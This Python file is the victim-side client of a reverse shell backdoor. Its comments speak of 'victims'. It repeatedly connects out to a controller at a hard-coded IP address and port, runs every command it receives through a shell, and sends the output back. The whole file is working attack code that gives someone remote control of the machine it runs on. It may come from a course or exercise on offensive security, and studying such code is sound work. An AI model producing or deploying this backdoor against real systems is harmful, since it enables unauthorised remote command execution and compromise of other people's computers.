import socket
import time
import json
import subprocess

IP_ADDRESS = '192.168.0.16'
PORT = 54321

def reliable_send(data):
    jsondata = json.dumps(data)
    # SERVER
    # target = target, ip = sock.accept() below
    # jsondata has to be encoded to send ascii to victims as BYTEs
    
    # CLIENT
    # use victims' socket (s) to send jsondata.encode() 'ascii' as BYTEs
    s.send(jsondata.encode())
    
def reliable_recv():
    # Preparing to store data
    data = ''
    while True:
        try:
            # SERVER
            # Specify amount of BYTEs we wanna receive
            # Cuz data sending from victims are encoded BYTEs
            # Need to decode it upon receiving using .decode()
            # Need to trim the fucking '\n' '\r' to avoid errors using rstrip()
            
            # CLIENT
            # using victims' socket to receive commands
            data += s.recv(1024).decode().rstrip()
            # returning results
            return json.loads(data)
        except ValueError as e:
            # When we receive ValueError from execution
            # We continue the execution
            print(f'Error occurred: {e}\nContinuing...')
            continue
        
def connection():
    while True:
        # Our Server can start at anytime, whenever server is running
        # Victims will try to connect every 20 secs
        time.sleep(20)
        # Try to connect to our Server
        try:
            # connection() will run over & over again
            # until victims' socket is connected to server
            s.connect((IP_ADDRESS, PORT))
            # Establish a reverse shell
            shell()
            # Close socket object once reverse shell is established
            s.close()
            # Socket closed => Exit this program
            break
        except:
            # Keep trying to run connection()
            connection()
        
def shell():
    while True:
        # Receive command from server
        command = reliable_recv()
        # Exit program if 'q' is received from server
        if command == 'q':
            break
        else:
            # Execute the 'command' received from Server using process open
            # using subprocess module
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            # We get encoded data 'result' from 2 lines above
            # execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # result = execute.stdout.read() + execute.stderr.read()
            # It will throw us an Error if we do NOT decode result from above
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind socket => connection() => shell() => Call connection()
connection()
